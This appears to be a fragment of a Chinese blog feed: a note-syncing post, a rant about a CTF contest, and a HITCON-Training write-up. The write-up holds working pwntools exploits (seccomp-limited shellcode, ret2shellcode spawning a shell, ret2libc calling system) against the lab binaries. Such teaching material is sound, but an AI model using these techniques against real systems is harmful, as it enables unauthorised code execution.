class="headerlink" title="部署方式"></a>部署方式</h2><ul><li><p>安装git，下载vnote，注册企鹅云</p></li><li><p>创建一个新项目</p><p><img src="http://ww1.sinaimg.cn/large/6701be31gy1fwf1ozr85dj20w60isaap.jpg" alt=""></p></li><li><p>clone到本地</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://git.dev.tencent.com/xxxx/vnote_test.git</span><br><span class="line"><span class="built_in">cd</span> vnote_test</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"# vnote_test"</span> &gt;&gt; README.md</span><br><span class="line">git add README.md</span><br><span class="line">git commit -m <span class="string">"first commit"</span></span><br><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure><ul><li><p>vnote选择这个文件夹做目录</p></li><li><p>然后就可以愉快的写markdown了</p></li><li><p>编写一个简单的bat脚本，方便同步到远程仓库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">"%date% %time%"</span></span><br><span class="line">git push</span><br></pre></td></tr></table></figure><p><strong>同步效果图</strong></p></li></ul><p><img src="http://ww1.sinaimg.cn/large/6701be31gy1fwf1lor4i1j213h0k00uy.jpg" alt=""></p><h2 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h2><p>vnote还要很多强大的功能还不会用，一大堆笔记有排搬了[哭]。本文纯属凑数，如有不对的地方，请无视~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;之前一直用有道云做笔记，然而有道云的功能实在太垃圾了，唯一值得称赞的就只有免费空间大和同步速度快了，不支持代码高亮，搜索功能垃圾得无法忍受，找笔记全靠大脑模糊索引。是时候淘汰这种垃圾软件了！！！&lt;/p&gt;
&lt;p&gt;自从学习了用markdown做笔记之后，就一发不可收拾了，有道云
      
    
    </summary>
    
    
      <category term="杂" scheme="https://4f-kira.github.io/tags/%E6%9D%82/"/>
    
  </entry>
  
  <entry>
    <title>某比赛吐槽</title>
    <link href="https://4f-kira.github.io/2018/09/07/wangdingbei/"/>
    <id>https://4f-kira.github.io/2018/09/07/wangdingbei/</id>
    <published>2018-09-07T13:41:09.000Z</published>
    <updated>2018-09-07T13:45:38.597Z</updated>
    
    <content type="html"><![CDATA[<p> 今年参加了一次某春秋的红帽杯，已经被恶心了一次，想不想这次网鼎杯更加肆无忌惮。本来是不打算参加的，所以也没认真准备。</p><p> <img src="http://ww1.sinaimg.cn/large/6701be31gy1fv1b29wr0nj21400u0q5z.jpg" alt="image"></p><p> <img src="http://ww1.sinaimg.cn/large/6701be31gy1fv1b2jjp0xj21400u00x4.jpg" alt="image"></p><h2 id="半决赛"><a href="#半决赛" class="headerlink" title="半决赛"></a>半决赛</h2><h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p>   一道web三道pwn，web的权限很迷，上去发现ctf的账号无法权限修改网站，一度懵逼，还好细心的队友发现可以<code>su apache</code>。好彩web没预留无脑一句话，不至于一上来就被上不死马（参考今年红帽杯，神一般的速度）。本组实力较弱，web很迟才有队伍拿一血，后面抓到别人的流量直接打回去了，不过脚本没准备好，重放速度有点慢。后面看pwn题，发现一道是原题，就是改了一下描述而已，然而gamebox用的是centos，dump下libc放在ubuntu，死活运行不起来，无法动态调试，中途一度想放弃治疗，后来换了个姿势，发现竟然成功getshell了，很幸运的拿下了pwn的一血。然而自动提交的脚本效果不佳，导致有一半的flag都没交上，有几轮甚至一个都没提交，后来发现不还如用burp跑稳定。之后，有队伍做出了其余两题pwn，其中一题成功抓到流量，由于一个低级错误，复现时间过长，导致被别人抛离了，另外一题流量没抓齐，之后再补吧。</p><h3 id="吐槽"><a href="#吐槽" class="headerlink" title="吐槽"></a>吐槽</h3><p>  拿到pwn之后，本以为可以轻松打全场，但是发现后来能打到的只10多队，很多直接是端口都不通，也不见有服务down扣分的情况，上通防我就认了，端口不通都不算服务异常？！队友举手找裁判投诉，后面也不了了之。事后看知乎吐槽，估计半决赛连check都没有，直接删站，删ELF完事。</p><h2 id="决赛"><a href="#决赛" class="headerlink" title="决赛"></a>决赛</h2><h3 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a>过程</h3><p>  时间没到，发现就能登gamebox了，然而快开始了有无缘无故断掉了，看到旁边的师傅已经准备脚本打过，瑟瑟发抖。网络连通后，发现web题跟昨天的一毛一样，有一题pwn也是（这么省钱吗？），手脚太慢，没把握住机会拿分，损失惨重。还有一个噩耗是，昨天通防pwn的方法不行了（看来昨晚加班写checker了），服务异常扣了很多分。名次一度到30+，后来稳住之后，靠昨天的脚本，慢慢的打回来了，web题也抓到Venenof7师傅的流量，也成功回放拿了不少flag，pwn题调整了一下脚本，可以稳定15+个flag，两题加起来有30+个flag，排名也稳步前进。当我以为可以苟住的时候，来自东方的神秘力量出现了，gamebox开始被打了，每轮都会被随机打一两个，开始手忙脚乱地去修复，不小心还导致服务down了几次，瞬间崩盘。事后发现，其实根本没必要修复，一切都是命运的安排（不便多说）。赛后发现pwn题其实不难，没花精力去搞一下确实太亏了，技不如人，甘拜下风。</p><h3 id="吐槽-1"><a href="#吐槽-1" class="headerlink" title="吐槽"></a>吐槽</h3><p>  决赛终于体验了一把什么叫神仙打架，什么0day拿flag，什么叫被安排得明明白白。还是好好学习吧，提升下技术，像人家eee，NU1l，0x300那么强劲，别人也安排不了你。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt; 今年参加了一次某春秋的红帽杯，已经被恶心了一次，想不想这次网鼎杯更加肆无忌惮。本来是不打算参加的，所以也没认真准备。&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;http://ww1.sinaimg.cn/large/6701be31gy1fv1b29wr0nj21400u0q5
      
    
    </summary>
    
    
      <category term="吐槽" scheme="https://4f-kira.github.io/tags/%E5%90%90%E6%A7%BD/"/>
    
  </entry>
  
  <entry>
    <title>Hitcon-Training-Writeup</title>
    <link href="https://4f-kira.github.io/2018/07/11/hitcontraining/"/>
    <id>https://4f-kira.github.io/2018/07/11/hitcontraining/</id>
    <published>2018-07-11T02:51:45.000Z</published>
    <updated>2018-07-11T03:10:28.928Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Outline"><a href="#Outline" class="headerlink" title="Outline"></a>Outline</h3><ul><li>Basic Knowledge<ul><li>Introduction<ul><li>Reverse Engineering<ul><li>Static Analysis</li><li>Dynamic Analysis </li></ul></li><li>Exploitation</li><li>Useful Tool<ul><li>IDA PRO</li><li>GDB</li><li>Pwntool</li></ul></li><li>lab 1 - sysmagic</li></ul></li><li>Section</li><li>Compile,linking,assmbler</li><li>Execution<ul><li>how program get run</li><li>Segment </li></ul></li><li>x86 assembly<ul><li>Calling convention </li><li>lab 2 - open/read/write</li><li>shellcoding</li></ul></li></ul></li><li>Stack Overflow<ul><li>Buffer Overflow</li><li>Return to Text/Shellcode<ul><li>lab 3 - ret2shellcode </li></ul></li><li>Protection<ul><li>ASLR/DEP/PIE/StackGuard</li></ul></li><li>Lazy binding</li><li>Return to Library<ul><li>lab 4 - ret2lib </li></ul></li></ul></li><li>Return Oriented Programming<ul><li>ROP<ul><li>lab 5 - simple rop </li></ul></li><li>Using ROP bypass ASLR<ul><li>ret2plt</li></ul></li><li>Stack migration<ul><li>lab 6 - migration</li></ul></li></ul></li><li>Format String Attack<ul><li>Format String </li><li>Read from arbitrary memory<ul><li>lab 7 - crack</li></ul></li><li>Write to arbitrary memory<ul><li>lab 8 - craxme</li></ul></li><li>Advanced Trick<ul><li>EBP chain </li><li>lab 9 - playfmt </li></ul></li></ul></li><li><p>x64 Binary Exploitation</p><ul><li>x64 assembly</li><li>ROP</li><li>Format string Attack</li></ul></li><li><p>Heap exploitation</p><ul><li>Glibc memory allocator overview</li><li>Vulnerablility on heap<ul><li>Use after free<ul><li>lab 10 - hacknote</li></ul></li><li>Heap overflow <ul><li>house of force <ul><li>lab 11 - 1 - bamboobox1</li></ul></li><li>unlink<ul><li>lab 11 - 2 - bamboobox2</li></ul></li></ul></li></ul></li></ul></li><li>Advanced heap exploitation<ul><li>Fastbin attack<ul><li>lab 12 - babysecretgarden </li></ul></li><li>Shrink the chunk</li><li>Extend the chunk<ul><li>lab 13 -  heapcreator</li></ul></li><li>Unsortbin attack<ul><li>lab 14 - magicheap</li></ul></li></ul></li><li>C++ Exploitation<ul><li>Name Mangling </li><li>Vtable fucntion table</li><li>Vector &amp; String</li><li>New &amp; delete</li><li>Copy constructor &amp; assignment operator<ul><li>lab 15 - zoo </li></ul></li></ul></li></ul><h3 id="lab1-sysmagic"><a href="#lab1-sysmagic" class="headerlink" title="lab1-sysmagic"></a>lab1-sysmagic</h3><p>这是一题逆向，应该是让你学会静态分析及动态调试。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fd = open(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);</span><br><span class="line">read(fd, &amp;buf, <span class="number">4u</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Give me maigc :"</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line"><span class="keyword">if</span> ( buf == v2 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0x30</span>; ++i )</span><br><span class="line">    <span class="built_in">putchar</span>((<span class="keyword">char</span>)(*(&amp;v5 + i) ^ *((_BYTE *)&amp;v54 + i)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>伪代码跟原C代码非常相似了，就是简单xor，静态方法代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v5 = <span class="string">"Do_you_know_why_my_teammate_Orange_is_so_angry???"</span></span><br><span class="line">v54 = [<span class="number">7</span>, <span class="number">59</span>, <span class="number">25</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">61</span>, <span class="number">30</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">18</span>, <span class="number">45</span>, <span class="number">40</span>, <span class="number">89</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">85</span>, <span class="number">22</span>, <span class="number">8</span>, <span class="number">31</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">126</span>, <span class="number">28</span>, <span class="number">62</span>, <span class="number">10</span>, <span class="number">30</span>, <span class="number">11</span>, <span class="number">107</span>, <span class="number">4</span>, <span class="number">66</span>, <span class="number">60</span>, <span class="number">44</span>, <span class="number">91</span>, <span class="number">49</span>, <span class="number">85</span>, <span class="number">2</span>, <span class="number">30</span>, <span class="number">33</span>, <span class="number">16</span>, <span class="number">76</span>, <span class="number">30</span>, <span class="number">66</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join([chr(ord(x)^y) <span class="keyword">for</span> x,y <span class="keyword">in</span> zip(v5,v54)]) <span class="comment">#CTF&#123;debugger_1s_so_p0werful_1n_dyn4m1c_4n4lySis!&#125;</span></span><br></pre></td></tr></table></figure></p><p>修改代码方法修改if的判断即可，<code>jnz</code>改<code>jz</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:08048722                 jz      short loc_8048760 ; Keypatch modified this from:</span><br><span class="line">.text:08048722                                           ;   jnz short loc_8048760</span><br></pre></td></tr></table></figure></p><p>patch后运行</p><p><img src="http://ww1.sinaimg.cn/large/6701be31gy1fsz88hg8mrj20g101y3yf.jpg" alt=""></p><p>gdb动态调试也可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b *get_flag+389  #下断点</span><br><span class="line">set $eax=$edx    #改成一样 cmp自然能过</span><br></pre></td></tr></table></figure></p><h3 id="lab2-orw-bin"><a href="#lab2-orw-bin" class="headerlink" title="lab2-orw.bin"></a>lab2-orw.bin</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/HITCON-Training/LAB/lab2/orw.bin&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  orw_seccomp();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Give my your shellcode:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;shellcode, <span class="number">0xC8</span>u);</span><br><span class="line">  ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))shellcode)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码很简单，输入后可以运行shellcode，但要留意一下<code>orw_seccomp()</code>这个函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">orw_seccomp</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int16 v1; <span class="comment">// [esp+4h] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// [esp+8h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [esp+Ch] [ebp-7Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+6Ch] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  qmemcpy(&amp;v3, &amp;unk_8048640, <span class="number">0x60</span>u);</span><br><span class="line">  v1 = <span class="number">12</span>;</span><br><span class="line">  v2 = &amp;v3;</span><br><span class="line">  prctl(<span class="number">38</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  prctl(<span class="number">22</span>, <span class="number">2</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这个函数会限制syscall的使用，本题只能用open,read,write这三个syscall来cat flag，需要手工进行shellcode编写。调用可通过man查看或到这个<a href="http://syscalls.kernelgrok.com" target="_blank" rel="noopener">网站</a>找<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">open</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *pathname, <span class="keyword">int</span> flags)</span></span>;              <span class="comment">//eax=0x5</span></span><br><span class="line"><span class="keyword">ssize_t</span> read(<span class="keyword">int</span> fd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> count);          <span class="comment">//eax=0x3</span></span><br><span class="line"><span class="keyword">ssize_t</span> write(<span class="keyword">int</span> fd, <span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> count);   <span class="comment">//eax=0x4</span></span><br></pre></td></tr></table></figure></p><p>手写版：<code>fp = open(&quot;flag&quot;,0) -&gt; read(fp,buf,0x30) -&gt; write(1,buf,0x30)</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./orw.bin'</span>)</span><br><span class="line">shellcode=<span class="string">'''</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">mov eax,0x5</span></span><br><span class="line"><span class="string">push ecx</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">mov ebx,eax</span></span><br><span class="line"><span class="string">mov ecx,esp</span></span><br><span class="line"><span class="string">mov ebx,0x3</span></span><br><span class="line"><span class="string">mov dl,0x30</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">mov eax,0x4</span></span><br><span class="line"><span class="string">mov bl,0x1</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">p.send(asm(shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><p>利用pwntools的<code>shellcraft</code>写：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">shellcode = shellcraft.pushstr(<span class="string">"flag"</span>)  <span class="comment">#flag路径</span></span><br><span class="line">shellcode += shellcraft.open(<span class="string">"esp"</span>)     </span><br><span class="line">shellcode += shellcraft.read(<span class="string">"eax"</span>, <span class="string">"esp"</span>, <span class="number">0x30</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>, <span class="string">"esp"</span>, <span class="number">0x30</span>)</span><br><span class="line">p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">p.send(asm(shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="lab3-ret2sc"><a href="#lab3-ret2sc" class="headerlink" title="lab3-ret2sc"></a>lab3-ret2sc</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/HITCON-Training/LAB/lab3/ret2sc&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-14h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Name:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;name, <span class="number">0x32</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Try your best:"</span>);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">int</span>)gets(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>name</code>处写入shellcode，覆盖<code>ret</code>为shellcode地址，需要注意的是通过esp寻址的，因此具体的offset可以通过调试查看<br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fszzph2uo0j20fk0280sp.jpg" alt="image"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./ret2sc'</span>)</span><br><span class="line">name = <span class="number">0x804a060</span></span><br><span class="line">p.sendlineafter(<span class="string">":"</span>,asm(shellcraft.sh()))</span><br><span class="line">p.sendlineafter(<span class="string">":"</span>,<span class="string">'a'</span>*<span class="number">32</span>+p32(name))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="lab4-ret2lib"><a href="#lab4-ret2lib" class="headerlink" title="lab4-ret2lib"></a>lab4-ret2lib</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/HITCON-Training/LAB/lab4/ret2lib&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> **v3; <span class="comment">// ST04_4</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ST08_4</span></span><br><span class="line">  <span class="keyword">char</span> src; <span class="comment">// [esp+12h] [ebp-10Eh]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+112h] [ebp-Eh]</span></span><br><span class="line">  _DWORD *v8; <span class="comment">// [esp+11Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"###############################"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Do you know return to library ?"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"###############################"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What do you want to see in memory?"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Give me an address (in dec) :"</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0xA</span>u);</span><br><span class="line">  v8 = (_DWORD *)strtol(&amp;buf, v3, v4);</span><br><span class="line">  See_something(v8);                            <span class="comment">// return printf("The content of the address : %p\n", *a1);</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Leave some message for me :"</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;src, <span class="number">0x100</span>u);</span><br><span class="line">  Print_message(&amp;src);                          <span class="comment">// strcpy(&amp;dest, src);</span></span><br><span class="line">                                                <span class="comment">// return printf("Your message is : %s", &amp;dest);</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Thanks you ~"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开了NX，程序自带打印内存信息的函数，泄露函数地址，溢出后组ROP即可<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">p = process(<span class="string">"./ret2lib"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./ret2lib"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">":"</span>, str(elf.got[<span class="string">"puts"</span>]))</span><br><span class="line">p.recvuntil(<span class="string">" : "</span>)</span><br><span class="line">libc.address = int(p.recvuntil(<span class="string">"\n"</span>, drop = <span class="keyword">True</span>), <span class="number">16</span>) - libc.symbols[<span class="string">"puts"</span>]</span><br><span class="line">success(<span class="string">"libcBase -&gt; &#123;:#x&#125;"</span>.format(libc.address))</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">'a'</span>*<span class="number">60</span>, libc.symbols[<span class="string">"system"</span>], <span class="number">0xdeadbeef</span>, next(elf.search(<span class="string">"sh\x00"</span>)))</span><br><span class="line">p.sendlineafter(<span class="string">" :"</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="lab5-simplerop"><a href="#lab5-simplerop" class="headerlink" title="lab5-simplerop"></a>lab5-simplerop</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/HITCON-Training/LAB/lab5/simplerop&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"ROP is easy is'nt it ?"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your input :"</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;v4, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先找一下常用的rop<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span 